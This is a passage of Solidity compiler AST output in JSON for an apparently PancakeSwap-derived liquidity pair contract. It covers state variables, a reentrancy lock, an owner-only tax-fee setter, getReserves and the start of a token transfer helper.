										"operator": "**",
										"rightExpression": {
											"argumentTypes": null,
											"hexValue": "33",
											"id": 953,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "449:1:6",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_3_by_1",
												"typeString": "int_const 3"
											},
											"value": "3"
										},
										"src": "443:7:6",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_1000_by_1",
											"typeString": "int_const 1000"
										}
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 964,
									"name": "SELECTOR",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "456:96:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes4",
										"typeString": "bytes4"
									},
									"typeName": {
										"id": 956,
										"name": "bytes4",
										"nodeType": "ElementaryTypeName",
										"src": "456:6:6",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes4",
											"typeString": "bytes4"
										}
									},
									"value": {
										"argumentTypes": null,
										"arguments": [
											{
												"argumentTypes": null,
												"arguments": [
													{
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"hexValue": "7472616e7366657228616464726573732c75696e7432353629",
																"id": 960,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "522:27:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_a9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b",
																	"typeString": "literal_string \"transfer(address,uint256)\""
																},
																"value": "transfer(address,uint256)"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_stringliteral_a9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b",
																	"typeString": "literal_string \"transfer(address,uint256)\""
																}
															],
															"id": 959,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "516:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																"typeString": "type(bytes storage pointer)"
															},
															"typeName": "bytes"
														},
														"id": 961,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "516:34:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes memory"
														}
													}
												],
												"expression": {
													"argumentTypes": [
														{
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes memory"
														}
													],
													"id": 958,
													"name": "keccak256",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 2350,
													"src": "506:9:6",
													"typeDescriptions": {
														"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
														"typeString": "function (bytes memory) pure returns (bytes32)"
													}
												},
												"id": 962,
												"isConstant": false,
												"isLValue": false,
												"isPure": true,
												"kind": "functionCall",
												"lValueRequested": false,
												"names": [],
												"nodeType": "FunctionCall",
												"src": "506:45:6",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												}
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												}
											],
											"id": 957,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"lValueRequested": false,
											"nodeType": "ElementaryTypeNameExpression",
											"src": "499:6:6",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_bytes4_$",
												"typeString": "type(bytes4)"
											},
											"typeName": "bytes4"
										},
										"id": 963,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "typeConversion",
										"lValueRequested": false,
										"names": [],
										"nodeType": "FunctionCall",
										"src": "499:53:6",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes4",
											"typeString": "bytes4"
										}
									},
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 966,
									"name": "factory",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "559:22:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 965,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "559:7:6",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 968,
									"name": "token0",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "587:21:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 967,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "587:7:6",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 970,
									"name": "token1",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "614:21:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 969,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "614:7:6",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 972,
									"name": "taxfee",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "641:18:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 971,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "641:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 974,
									"name": "reserve0",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "666:24:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint112",
										"typeString": "uint112"
									},
									"typeName": {
										"id": 973,
										"name": "uint112",
										"nodeType": "ElementaryTypeName",
										"src": "666:7:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint112",
											"typeString": "uint112"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 976,
									"name": "reserve1",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "752:24:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint112",
										"typeString": "uint112"
									},
									"typeName": {
										"id": 975,
										"name": "uint112",
										"nodeType": "ElementaryTypeName",
										"src": "752:7:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint112",
											"typeString": "uint112"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 978,
									"name": "blockTimestampLast",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "838:33:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint32",
										"typeString": "uint32"
									},
									"typeName": {
										"id": 977,
										"name": "uint32",
										"nodeType": "ElementaryTypeName",
										"src": "838:6:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint32",
											"typeString": "uint32"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 980,
									"name": "price0CumulativeLast",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "934:32:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 979,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "934:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 982,
									"name": "price1CumulativeLast",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "972:32:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 981,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "972:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 984,
									"name": "kLast",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "1010:17:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 983,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "1010:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 986,
									"name": "owner",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "1114:20:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 985,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "1114:7:6",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 989,
									"name": "unlocked",
									"nodeType": "VariableDeclaration",
									"scope": 2224,
									"src": "1140:25:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 987,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "1140:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "31",
										"id": 988,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "1164:1:6",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_1_by_1",
											"typeString": "int_const 1"
										},
										"value": "1"
									},
									"visibility": "private"
								},
								{
									"body": {
										"id": 1007,
										"nodeType": "Block",
										"src": "1187:113:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 994,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 992,
																"name": "unlocked",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 989,
																"src": "1205:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "31",
																"id": 993,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1217:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1_by_1",
																	"typeString": "int_const 1"
																},
																"value": "1"
															},
															"src": "1205:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a204c4f434b4544",
															"id": 995,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1220:17:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c084a590425edfe86a11f73831c0243820669c7e4ae4ddc8e665ae7ef10c474a",
																"typeString": "literal_string \"Pancake: LOCKED\""
															},
															"value": "Pancake: LOCKED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_c084a590425edfe86a11f73831c0243820669c7e4ae4ddc8e665ae7ef10c474a",
																"typeString": "literal_string \"Pancake: LOCKED\""
															}
														],
														"id": 991,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "1197:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 996,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1197:41:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 997,
												"nodeType": "ExpressionStatement",
												"src": "1197:41:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1000,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 998,
														"name": "unlocked",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 989,
														"src": "1248:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 999,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1259:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "1248:12:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1001,
												"nodeType": "ExpressionStatement",
												"src": "1248:12:6"
											},
											{
												"id": 1002,
												"nodeType": "PlaceholderStatement",
												"src": "1270:1:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1005,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1003,
														"name": "unlocked",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 989,
														"src": "1281:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 1004,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1292:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "1281:12:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1006,
												"nodeType": "ExpressionStatement",
												"src": "1281:12:6"
											}
										]
									},
									"documentation": null,
									"id": 1008,
									"name": "lock",
									"nodeType": "ModifierDefinition",
									"parameters": {
										"id": 990,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1184:2:6"
									},
									"src": "1171:129:6",
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1019,
										"nodeType": "Block",
										"src": "1383:93:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 1014,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1011,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2356,
																	"src": "1401:3:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 1012,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "1401:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 1013,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 986,
																"src": "1415:5:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "1401:19:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6e",
															"id": 1015,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1422:35:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_1b988f8784cc3cf7ad7d1bf59197df07b7925b5a748a478400a8f83fd9e196ef",
																"typeString": "literal_string \"Only owner can call this function\""
															},
															"value": "Only owner can call this function"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_1b988f8784cc3cf7ad7d1bf59197df07b7925b5a748a478400a8f83fd9e196ef",
																"typeString": "literal_string \"Only owner can call this function\""
															}
														],
														"id": 1010,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "1393:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1016,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1393:65:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1017,
												"nodeType": "ExpressionStatement",
												"src": "1393:65:6"
											},
											{
												"id": 1018,
												"nodeType": "PlaceholderStatement",
												"src": "1468:1:6"
											}
										]
									},
									"documentation": null,
									"id": 1020,
									"name": "onlyOwner",
									"nodeType": "ModifierDefinition",
									"parameters": {
										"id": 1009,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1380:2:6"
									},
									"src": "1362:114:6",
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1031,
										"nodeType": "Block",
										"src": "1535:64:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1029,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1027,
														"name": "taxfee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 972,
														"src": "1545:6:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1028,
														"name": "_newtax",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1022,
														"src": "1554:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1545:16:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1030,
												"nodeType": "ExpressionStatement",
												"src": "1545:16:6"
											}
										]
									},
									"documentation": null,
									"id": 1032,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1025,
											"modifierName": {
												"argumentTypes": null,
												"id": 1024,
												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1020,
												"src": "1525:9:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "1525:9:6"
										}
									],
									"name": "taxfeeupdate",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1023,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1022,
												"name": "_newtax",
												"nodeType": "VariableDeclaration",
												"scope": 1032,
												"src": "1504:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1021,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "1504:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1503:14:6"
									},
									"returnParameters": {
										"id": 1026,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1535:0:6"
									},
									"scope": 2224,
									"src": "1482:117:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1053,
										"nodeType": "Block",
										"src": "1791:117:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1043,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1041,
														"name": "_reserve0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1035,
														"src": "1801:9:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1042,
														"name": "reserve0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 974,
														"src": "1813:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "1801:20:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 1044,
												"nodeType": "ExpressionStatement",
												"src": "1801:20:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1047,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1045,
														"name": "_reserve1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1037,
														"src": "1831:9:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1046,
														"name": "reserve1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 976,
														"src": "1843:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "1831:20:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 1048,
												"nodeType": "ExpressionStatement",
												"src": "1831:20:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1051,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1049,
														"name": "_blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1039,
														"src": "1861:19:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1050,
														"name": "blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 978,
														"src": "1883:18:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"src": "1861:40:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"id": 1052,
												"nodeType": "ExpressionStatement",
												"src": "1861:40:6"
											}
										]
									},
									"documentation": null,
									"id": 1054,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getReserves",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1033,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1627:2:6"
									},
									"returnParameters": {
										"id": 1040,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1035,
												"name": "_reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 1054,
												"src": "1688:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1034,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1688:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1037,
												"name": "_reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 1054,
												"src": "1719:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1036,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1719:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1039,
												"name": "_blockTimestampLast",
												"nodeType": "VariableDeclaration",
												"scope": 1054,
												"src": "1750:26:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 1038,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "1750:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1674:112:6"
									},
									"scope": 2224,
									"src": "1607:301:6",
									"stateMutability": "view",
									"superFunction": 785,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1095,
										"nodeType": "Block",
										"src": "1984:268:6",
										"statements": [
											{
												"assignments": [
													1064,
													1066
												],
												"declarations": [
													{
														"constant": false,
														"id": 1064,
														"name": "success",
														"nodeType": "VariableDeclaration",
														"scope": 1095,
														"src": "1995:12:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1063,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1995:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1066,
														"name": "data",
														"nodeType": "VariableDeclaration",
														"scope": 1095,
														"src": "2009:17:6",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1065,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "2009:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1076,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1071,
																	"name": "SELECTOR",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 964,
																	"src": "2077:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1072,
																	"name": "to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1058,
																	"src": "2087:2:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1073,
																	"name": "value",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1060,
																	"src": "2091:5:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	},
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	},
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
